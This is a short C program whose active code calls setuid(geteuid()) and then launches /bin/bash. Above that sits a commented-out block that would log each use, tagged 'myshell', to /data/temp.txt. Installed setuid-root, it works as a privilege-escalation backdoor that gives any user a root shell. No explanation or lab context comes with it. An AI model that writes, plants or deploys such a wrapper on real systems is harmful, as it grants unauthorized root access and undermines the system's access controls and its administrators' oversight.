#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <time.h> // For time-related functions

int main() {
    /**
    FILE *file = fopen("/data/temp.txt", "a"); // "a" opens for appending
    if (file == NULL) { 
        perror("Error opening file");
        // Handle the error appropriately, maybe exit or log it
        return 1;
    }

    // Get the current time
    time_t rawtime;
    struct tm *timeinfo;
    char buffer[80];

    time(&rawtime);
    timeinfo = localtime(&rawtime);

    // Format the time string
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo);

    // Construct the final string to write
    char log_string[100]; // Adjust size if needed
    snprintf(log_string, sizeof(log_string), "       %s myshell\n", buffer); // Added \n for a new line

    // Write to the file
    fprintf(file, "%s", log_string);

    // Close the file
    fclose(file);
    **/
    setuid(geteuid());
    system("/bin/bash");

    return 0;
}
